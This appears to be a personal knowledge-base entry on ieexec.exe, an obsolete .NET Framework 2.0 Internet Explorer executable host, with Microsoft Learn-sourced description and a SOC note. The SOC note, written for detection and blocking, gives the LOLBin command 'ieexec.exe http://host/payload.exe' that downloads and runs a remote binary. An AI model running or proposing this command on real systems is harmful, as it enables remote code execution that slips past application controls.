---
created: 2026-11-21
fullpath: 'C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe'
generator:
  - claude
  - microsoftlearn
tags:
  - windows
  - executable
  - dotnet
  - lolbin
aliases:
  - ieexec.exe
  - IEExec.exe
  - IEExec
url:
  - https://learn.microsoft.com/dotnet/framework/whats-new/obsolete-types
  - https://learn.microsoft.com/dotnet/framework/migration-guide/net-framework-4-migration-issues
  - https://learn.microsoft.com/dotnet/api/iehost.execute.ieexecuteremote?view=netframework-3.5
---

**fullpath**:C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe

# description

IEExec.exe is a .NET Framework 2.0-3.5 host assembly used, with IEHost.dll, to host Windows Forms controls and run managed executables in Internet Explorer. It was removed in .NET Framework 4 and all its types are obsolete; alternatives are ClickOnce, XBAP and Silverlight.

## simple description

> ### 2026-11-21 Claude said
> ieexec.exe is the old .NET Framework 2.0 'Internet Explorer Executable' host. It let Internet Explorer download and run a .NET program from a URL in a restricted sandbox. It is obsolete but still present on systems with .NET 3.5 installed.
>
> **SOC NOTE**: Known LOLBin: `ieexec.exe http://host/payload.exe` downloads and runs a .NET binary from a remote URL (T1218 System Binary Proxy Execution, T1105). Any execution on a modern system is suspicious; hunt for ieexec.exe with URL arguments or network connections and block it with WDAC/AppLocker.
>

# purpose

Runs managed applications over the Internet (via IEExecRemote.dll IEExecuteRemote class) and hosts Windows Forms controls in Internet Explorer in a sandboxed application domain. Not supported as of .NET Framework 4; Internet Explorer zone policies Run .NET Framework-reliant components (signed / not signed with Authenticode) governed whether such managed executables linked from pages could run.

# typical use cases

_Not documented on Microsoft Learn at 2026/11/21 18:48 UTC_

# options

_Not documented on Microsoft Learn at 2026/11/21 18:48 UTC_
